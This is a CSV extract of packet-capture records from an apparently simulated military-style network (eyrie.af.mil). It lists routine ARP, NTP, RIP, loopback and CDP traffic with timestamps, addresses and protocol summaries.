"R"," R", "3017298","21:42:36.823533","","","LOOP","60","Reply"
"R"," R", "3017299","21:42:43.655011","","","ARP","60","Who has 172.16.112.100? Tell 172.16.113.50"
"R"," R", "3017300","21:42:46.821106","","","LOOP","60","Reply"
"R"," R", "3017301","21:42:51.296473","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"R"," R", "3017302","21:42:51.961823","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017303","21:42:51.962307","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"R"," R", "3017304","21:42:56.286024","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017305","21:42:56.286241","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017306","21:42:56.818929","","","LOOP","60","Reply"
"R"," R", "3017307","21:43:03.927924","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017308","21:43:06.928697","","","LOOP","60","Reply"
"R"," R", "3017309","21:43:07.650594","","","ARP","60","Who has 172.16.112.100? Tell 172.16.113.50"
"R"," R", "3017310","21:43:07.733899","172.16.112.20","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017311","21:43:07.734363","172.16.112.10","172.16.112.20","NTP","90","NTP Version 3, server"
"R"," R", "3017312","21:43:13.250797","172.16.113.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017313","21:43:13.251265","172.16.112.10","172.16.113.50","NTP","90","NTP Version 3, server"
"R"," R", "3017314","21:43:16.926516","","","LOOP","60","Reply"
"R"," R", "3017315","21:43:26.279732","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017316","21:43:26.279937","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017317","21:43:26.924337","","","LOOP","60","Reply"
"R"," R", "3017318","21:43:29.095204","","","CDP","324","Device ID: loud.eyrie.af.mil.eyrie.af.mil  Port ID: Ethernet1  "
"R"," R", "3017319","21:43:32.344177","172.16.114.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017320","21:43:32.344647","172.16.112.10","172.16.114.50","NTP","90","NTP Version 3, server"
"R"," R", "3017321","21:43:33.273963","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017322","21:43:37.114311","","","LOOP","60","Reply"
"R"," R", "3017323","21:43:47.111924","","","LOOP","60","Reply"
"R"," R", "3017324","21:43:51.283876","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"R"," R", "3017325","21:43:55.946170","","","ARP","60","Who has 172.16.112.10? Tell 172.16.112.50"
"R"," R", "3017326","21:43:55.946235","","","ARP","42","172.16.112.10 is at 08:00:20:83:4a:82"
"R"," R", "3017327","21:43:55.946746","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
